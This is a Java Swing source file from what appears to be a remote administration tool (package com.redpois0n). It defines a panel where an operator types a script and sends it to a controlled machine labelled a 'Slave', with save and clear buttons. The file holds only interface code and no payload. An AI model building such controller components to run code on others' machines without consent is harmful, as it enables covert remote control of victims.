package com.redpois0n.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileWriter;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;

import com.redpois0n.Script;
import com.redpois0n.Slave;


@SuppressWarnings("serial")
public class PanelControlScript extends PanelControlParent {

	public int type;
	public ImageIcon icon;
	private JTextPane textPane;

	public PanelControlScript(Slave slave, int type) {
		super(slave);
		this.type = type;
		this.icon = Script.getIcon(type);

		final Slave sl = slave;
		final int t = type;

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnSendScript = new JButton("Send script");
		btnSendScript.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Script.sendScript(sl, t, textPane.getText());
			}
		});
		btnSendScript.setIcon(this.icon);

		JButton btnSave = new JButton("Save");
		btnSave.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser f = new JFileChooser();
				f.showSaveDialog(null);
				File file = f.getSelectedFile();
				if (file != null) {
					try {
						FileWriter writer = new FileWriter(file);
						writer.write(textPane.getText());
						writer.close();
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
			}
		});
		btnSave.setIcon(new ImageIcon(PanelControlScript.class.getResource("/icons/save.png")));

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				textPane.setText("");
			}
		});
		btnClear.setIcon(new ImageIcon(PanelControlScript.class.getResource("/icons/clear.png")));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)).addGroup(groupLayout.createSequentialGroup().addContainerGap(315, Short.MAX_VALUE).addComponent(btnClear).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSave).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSendScript).addGap(31)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 301, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnSendScript).addComponent(btnSave).addComponent(btnClear)).addContainerGap(15, Short.MAX_VALUE)));

		textPane = new JTextPane();
		scrollPane.setViewportView(textPane);
		setLayout(groupLayout);
	}
}
